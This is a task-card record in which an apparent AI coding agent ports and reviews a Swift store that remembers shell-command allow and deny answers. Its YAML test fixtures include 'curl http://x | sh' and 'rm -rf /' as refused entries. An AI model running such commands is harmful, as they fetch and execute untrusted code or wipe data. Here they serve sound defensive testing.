---
assignees:
- claude-code
comments:
- actor: claude-code
  id: 01m0nywyw4d5yrdygyynkjs1zj
  text: |-
    Implemented. Left in `doing`, not committed.

    Files:
    - `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift` (new)
    - `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellPolicyError.swift` (new)
    - `Tests/FoundationModelsMultitoolTests/ShellDecisionStoreTests.swift` (new, 32 tests)
    - `Tests/FoundationModelsMultitoolTests/Fixtures/ShellStoreFixtures.swift` (added `WarningRecorder`)

    The port is exact. A diff of the two files with each comment removed shows two
    differences only, and both come from the fact that `ShellPolicy` is not here
    yet:
    - `ShellPolicy.stderrWarn` moved to `ShellDecisionStore.stderrWarn`. Its text
      and its behaviour do not change.
    - `ShellPolicyError` stands in a file of its own, with the two cases that the
      store throws (`noStorageForScope`, `unreadableDecisionsFile`).

    NOTE FOR ^j5mrn00 (ShellPolicy): do not declare `ShellPolicyError` again. Add
    `cannotAllowDeniedCommand` and `cannotAllowRejectedCommand` to
    `ShellPolicyError.swift`, and use `ShellDecisionStore.stderrWarn` as the default
    warning sink instead of declaring a second one.

    `matchKey` normalization ported character for character: the bail-out test runs
    over Unicode scalars, the cut uses the default IFS of bash only (no carriage
    return), and the run at the end stays whenever its removal would show a
    backslash, leave more than one line, or leave a `<<`.

    Mutation check: `matchKey` was temporarily replaced with the naive version
    (`.whitespacesAndNewlines` trim plus `Character` membership). 11 issues went
    red across three tests, then the mutation was reverted. Thus the tests truly
    guard the narrow normalization.

    Verification:
    - `touch Sources/.../Capabilities/Shell/*.swift && swift build --build-tests`:
      no error and no new warning. The one warning
      ("missing creator for mutated node ... mlx-swift_Cmlx.bundle") comes from
      SwiftPM and stands before this change.
    - `swift test --filter ShellDecisionStore`: 32 of 32 pass.
    - `swift test`: 536 tests in 43 suites pass.

    The file imports `Darwin`, `Foundation`, `Synchronization` and `Yams`. It does
    not import `Operations`.
  timestamp: 2026-08-23T00:04:04.612785+00:00
- actor: claude-code
  id: 01m0p0eweananr41hm66bbm3pw
  text: |-
    ## Review Findings (2026-08-22 19:18)

    Scope: `review sha HEAD~1..HEAD` (commit `964a2d5`). 4 files, 1975 added lines.
    The engine returned 0 findings over 7 attempted validators. A targeted security
    audit of the six points the card names found 1 test gap.

    ### Verification of the implementer claims

    - **"Byte-identical apart from two differences"** — TRUE for code. A diff with
      the comment lines removed gives 230 lines against 233. The only delta is the
      move of `stderrWarn` into `ShellDecisionStore`, plus the default parameter
      that now names it. The body is character-for-character the sibling
      `ShellPolicy.swift:859-861`. The raw 1358-line diff is all doc-comment text,
      rewritten into Simplified Technical English as CLAUDE.md tells you to.
    - **"11 issues red across 3 tests"** — the count is wrong, but it understates
      the guard. The literal mutant reddens 16 issues across 2 tests; a mutant that
      splits on all whitespace reddens about 22 across 3. The suite does guard
      `matchKey`. Do not quote the figure "11 / 3" as evidence.

    ### Security properties — all VERIFIED

    - `matchKey` collapses only for one line with none of `'` `"` `` ` `` `\` `$`
      (`ShellDecisionStore.swift:855-862`, set at `:800`).
    - The bail-out iterates Unicode scalars (`:857 trimmed.unicodeScalars`), so a
      quote that carries a combining mark cannot slip past.
    - Trimming is exactly `" \t\n"` (`:824`). No carriage return, no
      `.whitespacesAndNewlines`.
    - The trailing trim is kept for `exposesEscape`, `stillSpansLines`, and
      `mayOpenHeredoc` (`:906-911`); `<<-` matches because it contains `<<`.
    - Deny-wins is in the store at `decision(for:)` (`:424-430`) and is
      order-independent: it fills all three scopes, then tests `contains`.
    - File locking holds the read-modify-write as one critical section (`:492`),
      and 4 tests cover it, `flock` contention and the resolved-path key included.

    ### Finding

    - [x] `Tests/FoundationModelsMultitoolTests/ShellDecisionStoreTests.swift:456` —
          deny-wins covers 3 of 6 scope directions. No test puts an `allowAlways`
          in `.session` while another scope holds a `rejectAlways`. A mutant that
          returns the session answer before it looks for a refusal passes the whole
          suite. That mutant is the silent privilege grant this card guards against.
          Add the session-allow direction against `.user` and against `.project`,
          and the session-reject against `.project`.
          `theStoreNamesEachScopeThatHoldsAnAnswer` (`:468-481`) sets that state but
          asserts `scopes(remembering:)`, not `decision(for:)`, so it does not close
          the gap. The code is correct today; the test does not hold it correct.

          CLOSED 2026-08-22 20:36. The two deny-wins tests are now one
          parameterized test, `aRefusalInOneScopeBeatsAnApprovalInAnyOther`, over
          **all six** ordered pairs of two different scopes. A `RefusalDirection`
          value names each pair in the test report, and a `stage` fixture puts an
          answer into any scope — through the store for `.session`, by a hand
          written file for `.user` and `.project`. The named mutant
          (`if let session = remembered[.session] { return session }` before the
          `contains` test) was applied and measured: it reddens **2 issues in 1
          test**, the two directions `user rejects over session allows` and
          `project rejects over session allows`. No other test in the suite went
          red under it, which is the proof that the earlier suite let it pass. The
          mutation was then reverted; `git diff Sources/` is empty.

    ### Follow-up, not of this card

    - The sibling test `decisionsFileSitsBesideTheConfigInEveryDefaultLayer`
      (`ShellPolicyDecisionTests.swift:777-791`) has no counterpart, because it
      needs `ShellPolicy`. Nothing pins the default layer locations yet. File a card
      for when `ShellPolicy` lands.

      FILED as `^wev2kjk`, tagged `phase-2` and `eventplan`, blocked by `^j5mrn00`.

    ### Gates

    - `swift test --filter ShellDecisionStore` — 32 tests, 1 suite, pass.
    - `swift test` — 536 tests, 43 suites, pass.
    - `swift build --build-tests` — exit 0. The one warning is the pre-existing
      mlx-swift bundle packaging message, not of this change.
    - The store imports `Darwin`, `Foundation`, `Synchronization`, `Yams`. It does
      not import `Operations`.
  timestamp: 2026-08-23T00:31:20.522159+00:00
- actor: claude-code
  id: 01m0p0g9s60gpxdp05zc3zbvex
  text: |
    ### finish iteration 1 — findings
    - implement: changed — 4 files (Capabilities/Shell/ShellDecisionStore.swift new, Capabilities/Shell/ShellPolicyError.swift new, ShellDecisionStoreTests.swift new with 32 tests, Fixtures/ShellStoreFixtures.swift added WarningRecorder)
    - test: green — a forced rebuild reports no compiler warning; `swift test` gives 536 tests in 43 suites passed, 0 failures, 0 skipped, over two runs
    - commit: 964a2d5 — feat(shell): port ShellDecisionStore, the remembered answer store
    - review: findings — 1 confirmed, at Tests/FoundationModelsMultitoolTests/ShellDecisionStoreTests.swift:456
    - verified good: each of the six security properties holds — the collapse is gated on one line and no quoting character; the bail-out reads Unicode scalars; the trim is IFS only, with no carriage return; the trailing trim is kept for an escaping backslash, more than one line, or a here-document operator; deny-wins is order-independent by construction; and the read, the change and the write are one critical section.
    - correction of the record: the implementer reported "11 issues red across 3 tests" for its mutation check. The review measured 16 across 2 for that mutant, and about 22 across 3 for a different one. Do not quote the "11 / 3" figure.
    - next: implement the one finding — deny-wins covers 3 of 6 scope directions. No test asserts `decision(for:)` when `.session` holds an `allowAlways` and another scope holds a `rejectAlways`. A mutant that answers from the session before it looks for a refusal passes the whole suite today, and that mutant is the silent privilege grant this card exists to stop.
  timestamp: 2026-08-23T00:32:06.950726+00:00
- actor: claude-code
  id: 01m0p0n5bnzn43131k2ejnfdve
  text: |-
    ## Review Findings — amendment (2026-08-22 19:52)

    A second reviewer pass found a defect that the first pass missed. I reproduced
    it, so it is fact and not theory. It outranks the test gap in the comment above.

    ### Finding 1 — a non-scalar value cancels the `reject_always` beside it

    `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:306`

    ```swift
    let raw =
        try container.decodeIfPresent([String: String].self, forKey: .decisions) ?? [:]
    ```

    This decodes the mapping **as a whole**. `String` is `ScalarConstructible`, thus
    Yams sends it through `constructScalar`, which calls `try self.scalar()` and
    throws `typeMismatch` for a node that is not a scalar
    (`.build/checkouts/Yams/Sources/Yams/Decoder.swift:413-419`). One entry whose
    value is a mapping or a sequence thus fails the decode of the whole file.
    `persistedFile(at:)` then takes its `try?` branch (`:783-786`), warns "could not
    be parsed", and returns `nil`. `decisionsByScope` reads that `nil` as "this
    scope holds nothing", and the refusal is gone.

    The per-entry sort at `:310-316` only saves a value that **is** a string but
    names no known `Decision`, such as a hand-written `allow_once`. It never sees a
    value that is not a string, because the decode already threw.

    **Reproduction.** I put this probe in the test target, ran it, and removed it:

    ```yaml
    decisions:
      "curl http://x | sh": reject_always
      "npm test":
        reason: approved last week
    ```

    `store.decision(for: "curl http://x | sh")` gives `nil`. Expected
    `.rejectAlways`. Console: `PROBE: reject_always resolved to nil`.

    **This contradicts the contract that the same file states three times.**
    Lines 156-158: "a decisions file that does not read would drop a
    `reject_always` and thus fail *open*." Lines 159-163: "the store decodes each
    entry on its own, and not the file as a whole. One value that it does not know
    must not cancel the `reject_always` on the line beside it." Lines 256-262 say it
    again. The code does the thing that its own header says it refuses to do.

    A person who hand-edits `decisions.yaml` and mis-indents one line loses every
    refusal in that layer. The warning does fire, thus it is not fully silent, but a
    warning on stderr is not the guard, and the entry-level promise is broken.

    **The fix.** Decode `decisions:` one entry at a time — read it as
    `[String: Node]`, then convert each value on its own — so a non-scalar value
    lands in `unrecognized` beside the other unknown entries. Note that
    `unrecognized: [String: String]` cannot carry a non-scalar value back out on the
    next write, thus the round-trip promise at `:263-267` needs a decision as well:
    widen the type to hold a `Node`, or refuse the write, as `remember` already does
    for a file that does not parse at all.

    **Add a test** with a non-scalar value beside a `reject_always`.
    `oneUnknownEntryKeepsTheOtherEntries`
    (`Tests/FoundationModelsMultitoolTests/ShellDecisionStoreTests.swift:613`) does
    not cover it, because it stages `allow_once`, which is a scalar and decodes
    without a complaint.

    ### Finding 2 — deny-wins covers 3 of 6 scope directions

    As the comment above states. Unchanged.

    ### Note for the Shelltool board

    The port is byte-identical here, thus
    `../FoundationModelsShelltool/Sources/ShellTool/ShellDecisionStore.swift` holds
    finding 1 as well. The implementer of this card did not introduce it; they
    carried it over faithfully. Raise a card on the Shelltool board, because this
    repo must not be the only one that gets the fix.
  timestamp: 2026-08-23T00:34:46.261304+00:00
- actor: claude-code
  id: 01m0p0tvp0wzb0kxeqkp8yj5zh
  text: |-
    Re-implement pass for the one review finding. Left in `doing`, not committed.

    File changed: `Tests/FoundationModelsMultitoolTests/ShellDecisionStoreTests.swift`
    (+88 / -29). No source file changed; `git diff Sources/` is empty.

    ## What changed

    The two deny-wins tests (`aRejectInOneLayerBeatsAnAllowInAnother`, 2 cases, and
    `aSessionRejectBeatsAWrittenAllow`) are now one parameterized test,
    `aRefusalInOneScopeBeatsAnApprovalInAnyOther`, over **all six** ordered pairs of
    two different scopes:

    - user rejects over project allows
    - project rejects over user allows
    - session rejects over user allows
    - session rejects over project allows   (new)
    - user rejects over session allows      (new)
    - project rejects over session allows   (new)

    Two new parts hold it:

    - `RefusalDirection` — a `Sendable`, `CustomStringConvertible` pair of the
      scope that refuses and the scope that approves. Its description names the
      direction in the test report, thus a failure says which direction broke.
    - `stage(_:in:on:user:project:)` — a fixture that puts an answer into any
      scope. The session answer goes through the store; a layer answer is a file
      that the test writes by hand. The store reads each file again at each lookup,
      thus the order of two such calls does not change the result.

    ## Mutation check — measured, not estimated

    Mutation applied to `decision(for:)`, exactly the one the review named:

        let remembered = decisionsByScope(for: command)
        if let session = remembered[.session] { return session }   // <- mutant
        if remembered.values.contains(.rejectAlways) { return .rejectAlways }

    `swift test --filter ShellDecisionStore` under the mutant:

        Test run with 31 tests in 1 suite failed after 0.306 seconds with 2 issues.

    Both issues are in `aRefusalInOneScopeBeatsAnApprovalInAnyOther`, at
    `ShellDecisionStoreTests.swift:522:9`, on the two directions
    `user rejects over session allows` and `project rejects over session allows`.
    No other test in the suite went red. That is the proof that the earlier suite
    let this mutant pass. The mutation was then reverted.

    The review is correct that the earlier "11 issues across 3 tests" figure for
    the `matchKey` mutant is wrong. That figure is not repeated here. Only the
    numbers above were measured in this pass.

    ## Gates

    - `touch Sources/.../Capabilities/Shell/*.swift && swift build --build-tests`:
      exit 0. The one warning is the pre-existing mlx-swift bundle packaging
      message ("missing creator for mutated node ... mlx-swift_Cmlx.bundle"), not
      of this change.
    - `swift test --filter ShellDecisionStore`: 31 tests in 1 suite pass. The count
      falls from 32 to 31 because two test functions became one; the number of test
      cases for the rule rises from 3 to 6.
    - `swift test`: 535 tests in 43 suites pass, 0 failures.

    ## Follow-up filed

    `^wev2kjk` — "Pin the default decisions file beside the config of each layer".
    It ports `decisionsFileSitsBesideTheConfigInEveryDefaultLayer`, tagged
    `phase-2` and `eventplan`, and blocked by `^j5mrn00` (ShellPolicy).
  timestamp: 2026-08-23T00:37:52.960647+00:00
- actor: claude-code
  id: 01m0p0w8t7q0emcd1r7yf32pgd
  text: |
    ### finish iteration 2 — one finding closed, one still open

    The review AMENDED its first verdict while the implementer worked. Read both.

    **Closed — the deny-wins test gap.**
    - implement: changed — 1 file (ShellDecisionStoreTests.swift, +88 / -29). The two deny-wins tests became one parameterized test over all six ordered pairs of two different scopes.
    - measured mutation check: with `decision(for:)` answering from the session before it tests for a refusal, `swift test --filter ShellDecisionStore` failed with 2 issues, both in the new test, and **no other test in the suite went red**. That is direct proof the earlier suite let the mutant pass. The mutation was reverted.
    - gates: `swift test` gives 535 tests in 43 suites passed, 0 failures. The build reports no compiler warning.
    - follow-up filed: `^wev2kjk`, for the one sibling test that needs `ShellPolicy`.

    **STILL OPEN — a fail-open defect the second review pass found and reproduced.**

    `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:306` decodes the whole `decisions:` mapping as `[String: String]`. Yams sends a `String` through `constructScalar`, which throws `typeMismatch` on a node that is not a scalar. Thus ONE entry whose value is a mapping or a sequence fails the decode of the WHOLE file. `persistedFile(at:)` then takes its `try?` branch, warns, and answers `nil`, and `decisionsByScope` reads that `nil` as "this scope holds nothing".

    Reproduced with this file:

    ```yaml
    decisions:
      "curl http://x | sh": reject_always
      "npm test":
        reason: approved last week
    ```

    `decision(for: "curl http://x | sh")` answers `nil`. It must answer `.rejectAlways`.

    The header of the file forbids this three times, at lines 156 to 163: *"a decisions file that does not read would drop a `reject_always` and thus fail open"*, and *"the store decodes each entry on its own, and not the file as a whole. One value that it does not know must not cancel the `reject_always` on the line beside it."* The code does the thing its own header refuses.

    The per-entry sort at lines 310 to 316 rescues only a value that IS a string but names no known `Decision`. It never sees a non-string value, because the decode already threw. That is why `oneUnknownEntryKeepsTheOtherEntries` misses it.

    A person who mis-indents one line loses each refusal in that layer.

    The port is faithful, so the sibling carries the same defect. A card is filed on the FoundationModelsShelltool board.

    - next: decode `decisions:` one entry at a time as `[String: Node]`. Note that `unrecognized: [String: String]` cannot carry a non-scalar value back out, so the round-trip promise at lines 263 to 267 needs a decision too — widen the type, or refuse the write.
  timestamp: 2026-08-23T00:38:39.175092+00:00
- actor: claude-code
  id: 01m0p1nv945d82f2nf39n849tp
  text: |-
    Re-implement pass for the open fail-open finding. Left in `doing`, not committed.

    Files changed:
    - `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift` (+230 / -88 over both files)
    - `Tests/FoundationModelsMultitoolTests/ShellDecisionStoreTests.swift`

    ## The defect, reproduced first

    I wrote the tests before the fix and watched them fail. Measured, not
    estimated: `swift test --filter ShellDecisionStore` went from 31 tests to 36
    and reported **5 failed tests with 8 issues**. The first issue is the exact
    case the review named:

        ShellDecisionStoreTests.swift:777: store.decision(for: "curl http://x | sh") -> nil
          (expected .rejectAlways)

    The other four came from `remember` throwing `unreadableDecisionsFile` over the
    same file, because `persistedFile(at:)` answered `nil`.

    ## The fix

    The whole-collection decode is gone. `YAMLDecoder` and `YAMLEncoder` no longer
    appear anywhere in the store.

    - `ShellDecisionFile.init(yaml:)` composes the document with `Yams.compose`,
      then walks the `decisions:` mapping **one entry at a time**. An entry that
      the code does not understand — text that names no answer, a value that is a
      mapping, a value that is a sequence, a key that is not text — goes to
      `unrecognized`, and nothing about that entry can stop another entry from
      reading.
    - Only a fault in the shape of the WHOLE file throws, as the new
      `ShellDecisionFileError`: `notYAML`, `rootIsNotAMapping`,
      `decisionsIsNotAMapping`. None of these can lose a `reject_always`, because
      in each of them no key-to-answer entry exists to lose.
    - A document that holds nothing — an empty file, or only comments — now reads
      as no entries. Before, a file of comments only warned "could not be parsed"
      at every lookup and blocked every write. That was a false alarm.

    ## The round trip: I chose to WIDEN, not to refuse

    `unrecognized` is now `[UnknownEntry]`, and `UnknownEntry` holds the key
    `Node` and the value `Node` exactly as the file gives them. `yamlText()` puts
    them back node for node. Thus a write keeps a value of any shape, and a
    mis-indented line never costs the user their text.

    The store does NOT refuse the write for such an entry. A file whose entries all
    read as unknown is a readable file that holds no answer; to refuse there would
    stop the user from recording any answer in that layer for as long as the odd
    line stands. `remember` still refuses for a file that does not read at all,
    because there the store knows nothing to put back. The doc comment on
    `ShellDecisionFile` states this choice and the reason.

    `ShellDecisionFile` is no longer `Sendable`, because `Yams.Node` is not.
    Nothing needed it: the store reads a file, uses it, and drops it inside one
    call. The doc comment says so.

    ## The on-disk format did not drift

    `yamlText()` builds the YAML node itself, thus the bytes needed a proof.
    `theStoreEmitsTheSameBytesThatTheEncoderGave` compares `yamlText()` against
    `YAMLEncoder().encode(["decisions": [key: "allow_always"]])` — the exact call
    the store made before — over 5 keys: plain text, text with a pipe and a colon,
    text with a quote, text that YAML reads as a Boolean (`true`), and text over
    two lines. One key for each case, thus the order of a dictionary cannot make
    the comparison lie. All 5 give identical bytes.

    `twoWritesOfOneSetOfAnswersGiveTheSameBytes` also pins the exact text: the
    known answers now go out in the order of their key, thus a decisions file in a
    repository stops reordering itself at each write.

    ## New tests

    In `ShellDecisionStoreTests`:
    - `aMappingValueDoesNotCancelTheRefusalBesideIt` — the reproduction from the
      review, word for word.
    - `aSequenceValueDoesNotCancelTheRefusalBesideIt`
    - `aKeyThatIsNotTextDoesNotCancelTheRefusalBesideIt` — a `? [npm, test]` key.
    - `aFileInWhichNoEntryReadsIsEmpty` — behaves as empty, not as unreadable:
      the lookups answer `nil` AND `remember` does not throw.
    - `aRewriteKeepsAnEntryWhoseValueIsNotText` — the round-trip answer.
    - `aNewAnswerReplacesAnEntryWhoseValueIsNotText` — the user answering for that
      same command replaces the value the store could not read.
    - `aFileOfCommentsOnlyHoldsNoAnswerAndSendsNoWarning`
    - `theStoreEmitsTheSameBytesThatTheEncoderGave` (5 cases)
    - `twoWritesOfOneSetOfAnswersGiveTheSameBytes`

    Two existing call sites moved from `YAMLDecoder().decode(ShellDecisionFile
    .self, from:)` to `ShellDecisionFile(yaml:)`, thus they now exercise the real
    read path.

    ## Mutation check — measured

    I put the old behaviour back: after the walk finds a key or a value that is not
    a scalar, throw `decisionsIsNotAMapping` instead of setting the entry aside.
    That is the original fail-open, faithfully.

        swift test --filter ShellDecisionStore
        -> Test run with 39 tests in 1 suite failed with 8 issues

    All 8 issues are in the 5 new tests that cover a value or key of another shape.
    No other test in the suite went red, which is the proof that the earlier suite
    let this defect pass. The mutation was reverted.

    ## Audit for the same class

    `grep YAMLDecoder|YAMLEncoder|decodeIfPresent` over
    `Sources/.../Capabilities/Shell/` now finds nothing in the store. It held one
    whole-collection decode and one whole-collection encode; both are gone. The
    three remaining `try?` in the file are: reading the file text (warns and
    answers `nil`, which `remember` refuses over), reading the record (same), and
    rendering a node for a warning message (a message only — it can lose no data).

    ## Gates

    - `touch Sources/.../Capabilities/Shell/*.swift && swift build --build-tests`:
      exit 0. One warning only, the pre-existing mlx-swift bundle packaging message
      ("missing creator for mutated node ... mlx-swift_Cmlx.bundle"), which stands
      before this change.
    - `swift test --filter ShellDecisionStore`: 40 tests in 1 suite pass.
    - `swift test`: 544 tests in 43 suites pass, 0 failures. The count rises from
      535 by the 9 new test functions.
    - No `swift package update` was run. `.kanban/` was not touched.

    ## Note for the Shelltool board

    The card there still stands. This repo now holds the fix; the sibling
    `../FoundationModelsShelltool/Sources/ShellTool/ShellDecisionStore.swift` does
    not. The change to port is: drop the `Codable` conformance of
    `ShellDecisionFile`, add `init(yaml:)` and `yamlText()` over `Yams.compose` and
    `Yams.serialize`, widen `unrecognized` to hold key and value nodes, and take
    the 9 tests.
  timestamp: 2026-08-23T00:52:37.284333+00:00
- actor: claude-code
  id: 01m0p2t65mckkm6v7xxxekkrk5
  text: |
    ## Review Findings (2026-08-22 20:22) — iteration 3

    Scope: `review sha HEAD~1..HEAD` (commit `305d1cd`), 2 files, 504 added lines.
    The engine returned 0 findings over 7 validators. A targeted audit of the five
    risk points that the card names found 10 defects. Each one below was
    **measured** with a probe that links the same pinned Yams (6.2.2, `a27b21e`)
    and runs the old path beside the new one. None is theory.

    Probes: `.../scratchpad/yamsprobe` and `.../scratchpad/emitprobe`.

    ### The two earlier findings are CLOSED

    Both were confirmed on their own, and not from the report of the implementer.

    - [x] **Fail-open at `ShellDecisionStore.swift:306`** — CLOSED. `YAMLDecoder`
          and `YAMLEncoder` give 0 matches over the whole `Sources/` tree. An
          independent test, written new and then removed, staged the exact YAML of
          the finding and got `.rejectAlways`, with `npm test` as `nil`. The 6 new
          tests assert `decision(for:) == .rejectAlways`, and not only "it does not
          throw". `git status` is clean again.
    - [x] **Deny-wins gap at `ShellDecisionStoreTests.swift:456`** — CLOSED. The
          parameterized test covers all 6 ordered pairs of two different scopes,
          and each case asserts `decision(for:)`. The named mutation was applied
          again: 40 tests, **2 issues in 1 test**, exactly the two directions
          `user rejects over session allows` and `project rejects over session
          allows`. Reverted; `git diff Sources/` is empty and the suite passes.

    ### What the audit proves GOOD

    - **The emitter is byte-identical.** 69 key shapes were compared against
      `YAMLEncoder`: **0 divergences**. This covers each shape the card asks about
      — a key that needs quoting, a key that YAML reads as a number, as null, or
      as a Boolean in the YAML 1.1 sense (`yes`, `no`, `on`, `off`), a leading
      `#`, `-`, `?`, `:`, `&`, `*`, `!`, `%`, `@`, a trailing space, a tab, an
      emoji, a control character, a 1000-character key, `\r\n`, and a lone `\r`.
      The emitter options agree exactly (`indent=0 width=0 sortKeys=false
      explicitStart=false`), thus the line wrapping agrees. The empty file gives
      `decisions: {}\n` on both sides.
    - **The write window did not change.** The read, the change and the write stay
      one critical section. The write stays `atomically: true`, thus a temporary
      file and a rename, with no truncate-in-place window. `yamlText()` is fully
      evaluated before the file is opened, thus a throw from the emitter leaves the
      file byte for byte the same.
    - **Dropping `Sendable` is safe, and the compiler proves it.** `Package.swift`
      declares `swift-tools-version: 6.1` with no `swiftSettings` override, thus
      Swift 6 language mode enforces this. No `@unchecked Sendable` and no
      `nonisolated(unsafe)` anywhere in `Capabilities/Shell/`. No
      `ShellDecisionFile` and no `Yams.Node` escapes the call that makes it.

    ### Findings

    The first four are **regressions of this commit**: the old `YAMLDecoder` path
    read these files correctly, and the new walk does not.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:405`
          — **A merge key at the root hides `decisions:` completely, and sends no
          warning.** `Yams.compose` does not call `Node.Mapping.flatten()`. Only
          `Decoder.swift:184` and `Constructor.swift:445` call it, and the new code
          uses neither. Thus the root keeps the raw `<<` pair and the lookup of
          `decisions` misses.

          ```yaml
          base: &b
            decisions:
              "rm -rf /": reject_always
          <<: *b
          ```

          Measured: NEW gives `known=[:]`, no throw. OLD gives
          `["rm -rf /": "reject_always"]`. Because no error is thrown,
          `persistedFile` answers a **valid empty file**, thus **no warning is
          printed at all** and `decision(for:)` answers `nil`. This is a silent
          fail-open, which is worse than the defect this commit closed: that one at
          least warned. Call `flatten()` on the root mapping, or handle `<<`.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:415`
          — **A merge key inside `decisions:` turns each merged refusal into one
          unknown entry.**

          ```yaml
          common: &c
            "rm -rf /": reject_always
          decisions:
            <<: *c
            "ls": allow_always
          ```

          Measured: NEW gives `known=["ls": "allow_always"]` and 1 unknown entry
          whose key is `<<`. OLD gives both entries. The `reject_always` never
          reaches `decisions`. The warning names `"<<"`, and not the command, thus
          it does not tell the user which refusal stopped. A write puts the entry
          back with the alias expanded, thus the fault repeats for ever.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:409`
          — **`decisions:` with nothing under it makes the whole layer unusable,
          and this is the documented way a user cancels their last answer.** The
          header of this file says at line 29 that to cancel an answer is only to
          remove a line. A user with one remembered answer who removes that line
          leaves `decisions:\n`. `Yams.compose` reads the value as a null scalar,
          thus `entriesNode.mapping` is `nil` and line 410 throws
          `decisionsIsNotAMapping`.

          Measured: NEW throws. OLD read it as empty, because Yams `decodeNil` is
          `node.null == NSNull()` (`Decoder.swift:375`), which is true for a null
          scalar, thus `decodeIfPresent` answered `nil`.

          Result: every lookup warns "could not be parsed", and every `remember` to
          that layer throws `unreadableDecisionsFile`. The user cannot record any
          answer in that layer again until they hand-edit the file to
          `decisions: {}`. Read a null value as no entries, as the empty file
          already does at line 892.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:446`
          — **A write can emit two keys of the same text and make the layer file
          permanently unreadable.** Line 633 removes an unknown entry by
          `matchKey`, which is the scalar text. The parser compares whole `Node`
          values, the tag included. Thus two keys with the same text and different
          resolved tags both survive, and both emit as the same plain scalar.

          Start file (`yes` is a real command):

          ```yaml
          decisions:
            yes: allow_once
            "yes": reject_always
          ```

          Now `remember(.allowAlways, for: "ls", in: .user)` — any unrelated
          command. The emitted file holds `yes:` two times. Measured re-read:
          **throws `notYAML`**. The same happens for `1` / `"1"` and `~` / `"~"`.

          After that write `persistedFile` answers `nil` for that layer for ever:
          every `reject_always` in the layer stops working, and `remember` throws,
          thus the user can record nothing there again. The corrupt bytes stay on
          disk. This is the "a write must not corrupt the file of the user" point
          of the card, and it fails. Compare the key by the same rule that the
          parser uses, or refuse to emit a duplicate key.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:256`
          — **The doc of `ShellDecisionFileError` claims more than the code gives.**
          Lines 258-262 say that each case is about the shape of the whole file and
          that none of them can lose an entry. That is false for
          `decisionsIsNotAMapping` and for `rootIsNotAMapping`. A user who adds one
          dash writes a sequence of mappings that plainly holds a refusal:

          ```yaml
          decisions:
            - "rm -rf /": reject_always
          ```

          Measured: throws `decisionsIsNotAMapping`, thus the layer is dropped. A
          root sequence gives `rootIsNotAMapping` and does the same. Either read
          such an entry, or correct the claim. The card asks exactly this question,
          and the answer today is that the cases **can** lose an entry.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:291`
          — **The round-trip promise is too strong.** Lines 291-292 say
          `yamlText()` puts the entries back node for node, thus "a rewrite never
          destroys the text that the user typed", and lines 432-433 say a value of
          any shape comes through whole. Measured, a rewrite destroys a flow
          collection (`{a: b}` becomes a block mapping), a folded scalar (`>` joins
          its lines), an anchor and its alias (both become the value), an explicit
          tag (`!!str` is gone), and every comment. The cause is
          `Parser.swift:390`, which reads `event.mappingStyle` off the mapping-end
          event, thus each composed collection comes back `.any`. The *value* is
          correct; the *text* is not. State what the round trip truly keeps.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:447`
          — **A write deletes every other key at the top of the file, in silence.**
          `yamlText()` builds a root that holds the one `decisions` pair. A file
          that carries `version: 1` above `decisions:` loses that line at the next
          `remember`. The behaviour is as old as the `CodingKeys` encode, but the
          promise beside it at lines 291-292 is new, and it is false for this
          shape. Keep the other keys of the root, or correct the promise.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:394`
          — **A file of more than one document loses every refusal.**
          `Yams.compose` calls `Parser.singleRoot()`, which throws for a stream of
          two documents (`Parser.swift:245-258`). It does not answer the first
          document. Measured: a file whose first document holds a `reject_always`
          and which then has `---` throws `notYAML`, thus the layer is dropped. The
          text is valid YAML. Not new, but it is the same fail-open class.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:893`
          — **Any duplicate key anywhere in the file drops the whole layer.**
          `Parser.swift:386` calls `checkDuplicates` on every mapping and throws,
          thus a duplicate never reaches the walk and the per-entry rescue never
          runs. A duplicate at the **root**, far away from the refusal, does this
          as well:

          ```yaml
          decisions:
            "rm -rf /": reject_always
          notes: a
          notes: b
          ```

          Measured: throws `notYAML`, thus the refusal is lost. It warns. Not new,
          but the per-entry promise of this commit does not reach it.

    - [ ] `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift:634`
          — **This commit lets a file that the sibling cannot read persist and
          grow.** Both packages use the same layer paths
          (`~/.config/shell/decisions.yaml`, `{git_root}/.shell/decisions.yaml`;
          `ShellDotfolder.swift:43,51` in each). The sibling still decodes the whole
          collection at
          `../FoundationModelsShelltool/Sources/ShellTool/ShellDecisionStore.swift:284`.

          Before this commit, this repo also refused such a file, thus it could not
          grow. Now this repo reads it, keeps the entry, adds the new answer, and
          writes it back. Measured: the sibling throws on the original file **and**
          on what this repo wrote, thus the sibling drops every `reject_always` in
          that layer. The user sees this repo work and has no reason to think the
          sibling refuses each refusal. The card on the Shelltool board must land
          before or with this.

    ### Gates

    - `swift test --filter ShellDecisionStore`: 40 tests, 1 suite, pass.
    - `git status`: no tracked file changed. Only the 39 untracked `.kanban/`
      records of this session, which are not of this review.
  timestamp: 2026-08-23T01:12:28.084199+00:00
- actor: claude-code
  id: 01m0p2wb8p1m6ycmqtx9epmnzj
  text: |
    ### finish iteration 3 — STUCK. A person must choose the approach.

    - implement: changed — 2 files (Capabilities/Shell/ShellDecisionStore.swift, ShellDecisionStoreTests.swift)
    - test: green — `swift test` gives 544 tests in 43 suites passed, 0 failures, 0 skipped, over two runs
    - commit: 305d1cd — fix(shell): stop fail-open decision reads in ShellDecisionStore
    - review: findings — 10, each measured against real Yams, not reasoned

    **The two earlier findings ARE closed, and the review proved each one independently.**
